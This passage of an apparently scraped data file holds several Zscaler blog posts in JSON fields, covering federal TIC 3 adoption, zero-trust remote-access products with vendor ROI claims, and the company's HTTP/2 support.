wasn\u2019t built to accommodate emerging modern technologies such as cloud computing and mobile architectures.I observed this firsthand during my tenure at CISA. As cloud adoption accelerated and interagency collaboration became increasingly digital, it became clear that TIC 2 was no longer sustainable. Enter TIC 3: the modern, flexible framework officially announced in OMB Memo 19-26 in 2019.TIC 3\u2019s Game-Changing ApproachAt its core, TIC 3 builds on its predecessors but sacrifices rigidity for flexibility and agility. Agencies are no longer required to force all traffic through central aggregation points. Instead, they can adopt distributed architectures with the flexibility and freedom to design security perimeters and access points tailored to their specific needs, whether for remote users, edge computing, or cloud-based systems.One of TIC 3's primary strengths lies in its alignment with other modernization efforts, such as the Zero Trust cybersecurity model, a key focus of CISA during my time at the agency. The TIC 3 framework syncs with OMB Memo 22-09 and CISA\u2019s Zero Trust Maturity Model, seamlessly integrating into agencies\u2019 broader efforts to deploy scalable, secure, and reliable systems.Moreover, TIC 3 empowers scalability and transformation while reducing costs. Agencies transitioning from expensive, private MPLS networks are finding that TIC 3 allows them to adopt broadband connections, thereby lowering costs while simultaneously improving performance for remote and international users. According to a 2023 report by Deloitte, cloud adoption by public sector organizations is estimated to save agencies between 30% and 40% in IT infrastructure costs. This is a promise TIC 3 delivers on in measurable ways.A Real-World TIC 3 Deployment: Lessons from the TrenchesDuring the webinar, Joe Swanson, President of Implicit Solutions, and I detailed one real-world example of a federal agency's journey through TIC 3 adoption. This agency, burdened with a fragmented, outdated MPLS framework that served over 1,500 locations globally, faced significant user experience challenges. Internal users on the West Coast were required to route traffic to East Coast access points, resulting in slow load times. The cumbersome process of making even small changes to their network required coordination with multiple layers of bureaucracy.This agency began with a clear vision: improve performance for end users, enhance flexibility, and slash costs. Defining these goals upfront was critical, as implementing TIC 3 involves a phased approach. Their first step was setting up interconnection points (ICPs) on the East and West Coasts, allowing them to route regional traffic more effectively. To begin lessening their reliance on MPLS circuits, they transitioned to broadband internet and piloted 4G LTE, fiber, and satellite options.When the COVID-19 pandemic hit, the changes underwent a major stress test\u2014150,000 employees, originally working on-premises, had to go remote virtually overnight. Their newly installed TIC 3 architecture\u2014with Zscaler Private Access (ZPA) replacing the traditional VPN\u2014handled the sudden traffic surge without major disruption. Employees from either coast could seamlessly connect to the nearest data center or a private Zscaler node, dramatically improving performance.But the benefits of TIC 3 went beyond pandemic resilience. As the agency progressed, it replaced cumbersome proxies and optimized traffic routing through secure, cloud-first solutions such as Zscaler Internet Access (ZIA). The financial payoff was as clear as the performance gains: spending on circuits and TIC infrastructure dropped substantially, and the agency was able to reinvest those cost savings by upgrading their broadband connections to achieve even higher capacities.Adapting to a Cultural ShiftAs with any transformation, it wasn\u2019t all smooth sailing, and some of the challenges we faced during this transition were cultural rather than technical. Moving away from hardware firewalls, MPLS circuits, and traditional monitoring solutions like packet capture required IT teams to adapt a different mindset. Some employees, for example, were skeptical about using zero trust frameworks like ZPA because there was a common misconception that employing zero trust principles would blind them. My advice? Strong leadership and consistent training help to mitigate this hesitation and build trust in the new systems.Enabling Mission ResilienceFor agencies adopting TIC 3, security no longer has to be an \u201cadd-on\u201d that slows down operations. TIC 3 is not just a reframing of security\u2014it\u2019s a platform for mission resilience. Whether by providing seamless experiences for remote users, enabling agencies to better collaborate across networks, or enhancing compliance with visibility requirements through solutions like CISA\u2019s CLAW logging system, TIC 3 ensures that agencies can protect what\u2019s important while focusing on their core missions.TIC 3, paired with zero trust policies and cloud-forward strategies, will continue to provide federal agencies with both flexibility and robust security for years to come. Though the path to modernization requires significant effort and overcoming cultural hurdles, the journey is worth it\u2014and it\u2019s one I\u2019m proud to have been part of.If you couldn\u2019t attend the live webinar, you can&nbsp;watch it on demand.

      "summary": "When offices dissolved into kitchen tables, coffee shops, and airport lounges in 2020, it wasn\u2019t a temporary pivot \u2014 it was the opening salvo of a new order. Hybrid work didn\u2019t just decentralize the workforce; it redefined the scale and speed of global businesses.Organizations expanded into new markets without establishing physical offices, geographical boundaries blurred, remote markets became hotspots of global supply chains, deals closed faster, and partnerships formed overnight.Here\u2019s what kept CISOs up at night: everyone connected to the enterprise&nbsp; (employees, contractors, partners) operated inside its ecosystem. They all needed access. They all touched its data.The old perimeter didn\u2019t stretch, it snapped years ago.The hybrid workforce turned legacy security into a liability, one that slows people down, strangles M&amp;A value, and leaves the door cracked open for attackers.VPNs, Firewalls, and the Myth of Modern SecurityFive years on, too many organizations are still leaning on pandemic-era tools meant as stopgaps, and the cracks are impossible to ignore.VPNs were built for an era when \u201cremote work\u201d meant the occasional business trip. In 2025, forcing entire workforces through them is like trying to patch a typewriter to send emails. They slow teams down, throttle SaaS performance, and create single points of failure. Worse, once credentials are compromised, attackers have free rein across the network.Firewalls and appliance-based Secure Web Gateways promised visibility and control but deliver latency and blind spots instead. They were never designed for an encrypted, mobile, cloud-first enterprise.Today, over 95% of web traffic is encrypted, but legacy firewalls and SWGs lack the processing capacity to decrypt, inspect, and re-encrypt traffic at scale. Most sample only a fraction of SSL/TLS sessions, leaving encrypted tunnels as blind spots for command-and-control communications, data exfiltration, and zero-day malware.Static signature-based inspection is also obsolete as threats constantly morph and abuse trusted cloud services. Hardware appliances constrained by throughput can\u2019t decrypt inline without breaking apps or adding latency.The result is a trade-off no security leader wants to make. You either decrypt selectively and risk exposure, or decrypt broadly and risk performance collapse.The same legacy thinking stalls M&amp;A integrations. Stitching networks together and provisioning VPNs means newly acquired teams can\u2019t access ERP, CRM, or collaboration tools on Day-1. Productivity suffers, and value creation slows.Third-party access faces similar constraints. Vendors and contractors still get blanket VPN access or are forced into rigid VDI environments. In both cases, access control is coarse-grained, typically network-level rather than application-specific, making it difficult to enforce least privilege or prevent data sprawl.Your Network Isn\u2019t the Perimeter \u2014 Your Users AreMost enterprises still bolt their defenses to the network. That\u2019s the problem. Users don\u2019t live on the network anymore, and applications don\u2019t sit neatly in data centers. They\u2019re in the cloud, in SaaS, and scattered across hybrid environments.&nbsp;That\u2019s the essence of&nbsp;Zero Trust for Users,&nbsp;Zscaler\u2019s solution for connecting every user to every resource that they need\u2014securely, quickly, and reliably. Instead of extending implicit trust to anyone \u201con the network,\u201d every single connection is verified in real time: Who are you? What device are you using? Where are you connecting from? What app do you need? Based on those signals, you get just enough access to that one application, for that one session. Nothing more.Think of it like this: legacy security is a bouncer who checks your ID once at the front door and then lets you wander the entire club. Zero Trust is a different kind of host. Someone who escorts you through the club and checks your badge at every room, every time, and only lets you in if you belong. And unlike the bouncer, they don\u2019t slow the line; they make the whole place safer and faster. Your Zero Trust access solution is a concierge with access to tools like:Zscaler Internet Access (ZIA):&nbsp;Delivers inline inspection and threat prevention for all internet and SaaS traffic. Decrypts and inspects 100% of SSL/TLS sessions at scale, applying advanced DLP, CASB, and sandboxing inline without latency trade-offs. Eliminates backhauling and hardware bottlenecks through a distributed cloud enforcement fabric that scales elastically to user demand.Zscaler Private Access (ZPA):&nbsp;Delivers secure, identity-based access to private apps without putting users on the network. Outbound-only connections prevent lateral movement and IP exposure, while granular segmentation enforces least-privilege access across hybrid environments.Zscaler Digital Experience (ZDX):&nbsp;Monitors end-to-end user experience across devices, ISPs, networks, and apps, correlating telemetry to pinpoint latency or network issues in seconds. Uses synthetic transactions, packet capture, and performance baselines to optimize digital experience without compromising security enforcement.Zero Trust Browser:&nbsp;Secures web-based and third-party access sessions by executing them in a controlled, isolated environment. Prevents data exfiltration through inline redaction, clipboard and file-transfer controls, and pixel streaming. Shields backend applications from direct exposure while maintaining seamless user experience and native browser compatibility.Privileged Remote Access:&nbsp;Enables agentless, just-in-time access for admins via SSH, RDP, and VNC \u2014 without VPNs or jump hosts. Sessions are fully isolated, recorded, and command-controlled to prevent credential misuse and lateral movement.Zero Trust Firewall:&nbsp;Applies Layer 7 inspection, DNS filtering, and IPS across all ports and protocols. Uses AI-driven correlation to block command-and-control traffic, encrypted payloads, and evasive threats, replacing legacy firewall, IPS, and DNS appliances.Cloud Sandbox:&nbsp;Analyzes unknown files inline, detonating them safely to uncover zero-days, ransomware, and fileless malware. Integrates with ZIA and ZPA to block new threats before they execute or reach users.Zscaler Risk360:&nbsp;Together with ZIA, ZPA, and ZDX, Zscaler Risk360 extends the Zero Trust fabric into continuous risk intelligence, correlating user, device, and threat telemetry to quantify exposure and feed dynamic policy decisions within the Zero Trust Exchange.The beauty here isn\u2019t just the tools themselves. It\u2019s the unification. One policy fabric. One global enforcement layer.&nbsp;Ready for Action from Day OnePicture a VP of Sales connecting to Salesforce from an airport lounge. Under a VPN, her traffic hairpins through a corporate data center, crawling along at dial-up speeds. Under Zero Trust for Users, her traffic goes direct-to-cloud, inspected inline, and delivered without friction. She closes deals while her peers are still waiting for their dashboards to load.Now take third-party access. A vendor needs GitHub and Jira, not ERP or HR systems. With a VPN, you\u2019re stuck with two bad options: over-provision access and hope nothing breaks, or funnel them through a clunky VDI. With Zero Trust for Users, you grant time-bound, app-specific access that\u2019s fully auditable. They get the tools they need, nothing else, and access vanishes the moment the contract ends.Likewise, during an acquisition, a global enterprise needs to provide access to email, collaboration, and ERP systems to their newly acquired company in a remote region with limited IT capabilities. With traditional approaches, that means months of painful network integration and risky trust extensions. With Zero Trust for Users, the parent company applies its existing Zero Trust policies to the new workforce instantly.Day-1 secure productivity. Day-1 value delivery.And beyond access and performance, Zero Trust for Users reduces the entire IT stack footprint \u2014 removing VPN concentrators, firewalls, SWGs, proxies, DLP appliances, and VDI infrastructure. The result: simplified operations, predictable OPEX, and a measurable drop in total cost of ownership.This isn't a theory. It\u2019s Tuesday morning in a global enterprise.ROI That Builds ResilienceA critical consideration in any technology transition is the reduction of cost. In this case, technology cost reduction comes paired with reduced complexity and increased agility.&nbsp;Independent studies put hard numbers on the shift. We're talking 267% ROI with Zscaler Internet Access (ZIA) and 289% ROI with Zscaler Private Access (ZPA).Customers report up to 75% reductions in IT operational effort, 65% reductions in breach costs, and as much as $1.75M in annual infrastructure savings. They are also reclaiming thousands of productivity hours, in some cases 20,000 engineering hours a year.When measured holistically, Zscaler\u2019s Zero Trust for Users solution set doesn\u2019t just pay for itself. &nbsp;It consolidates entire categories of legacy tools, from firewalls and VPNs to on-prem DLP and SWG appliances. Every tool you retire is a cost avoided, every redundant license a budget reclaimed.That\u2019s beyond just defense\u2014it's a dividend.But here\u2019s the kicker: it\u2019s not just about saving money. It\u2019s about resilience. M&amp;A deals that don\u2019t choke on IT integration. Supply chains that actually collaborate instead of finger pointing towards each other. SaaS migrations without the CIO pacing the carpet.In a boardroom obsessed with both revenue velocity and risk, Zero Trust is no longer a line item. It is a growth strategy disguised as security.From Policy to People: Building Trust Where the Users AreThe borderless enterprise has markedly changed over the past five years, and change won\u2019t stop in the next five. Clearly, many organizations still have work to do on their cybersecurity transformation and governance. Yet, despite the plethora of articles and advice aimed at guiding boards and their CISOs, the evidence continues to show a persistent \u201cgap\u201d between strategy and execution.The future of enterprise security won\u2019t be measured by how many boxes sit in your data center. It will be measured by how securely your people can work from Day 1, whether they\u2019re full-time employees, contractors, or the newest members of your post-M&amp;A team.That\u2019s what Zero Trust for Users delivers:One unified fabric for employees, third parties, and acquired teams.One policy for SaaS, private apps, and internet traffic.One platform that makes work faster, safer, and easier \u2014 from anywhere.If your current model can\u2019t deliver that, it\u2019s not just outdated, it\u2019s holding your business back.Want to get started?&nbsp;Speak to one of our experts for a free consultation.",

      "summary": "What is HTTP/2?The Hypertext Transfer Protocol (HTTP) forms the foundation of nearly all web-based communication, enabling computers and servers to exchange information seamlessly. Whenever a user visits a website, their browser relies on HTTP to request the necessary data \u2013 such as text, images, and formatting \u2013 that transforms a server's response into what the user sees displayed. HTTP/1.1 marked a significant step in the protocol\u2019s evolution and continues to be widely utilized today, though it has limitations that modern web demands exposed over time. In response to these shortcomings, HTTP/2 was launched. And it has emerged as the communications backbone for a vast segment of the modern internet, delivering significant advancements over its predecessor with faster page loads, lower latency, and multiplexed connections.Zscaler and HTTP/2: Pioneering Modern Internet Protocol&nbsp;When it comes to cloud security, at Zscaler we strongly believe the journey doesn\u2019t end at innovation; it is an ongoing commitment to our customers\u2019 operational success. We strive not just to lead technologically, but also to ensure that real-world deployments yield seamless user experiences. Our evolution with HTTP/2 exemplifies this ongoing pledge.Zscaler has supported HTTP/2 traffic across our cloud service edges for several years, enabling customers to leverage its performance and efficiency without compromising on security inspection or threat prevention.Final Thoughts: Customer Success, Innovation, and ReliabilityThis experience reflects a core Zscaler belief: the best technology is only as good as the customer experience it delivers. By rapidly adapting to the realities of HTTP/2 protocol limits and cloud provider quirks, we reinforced our commitment to our customers\u2019 mission-critical operations.As we continue innovating for the modern internet, Zscaler will always put customers first - proactively ensuring both security and seamless access, no matter how the technology landscape evolves.If you\u2019d like to learn more about Zscaler\u2019s HTTP/2 support or have questions about optimizing cloud application performance and security, reach out to us or explore our&nbsp;technical documentation for in-depth guidance.",
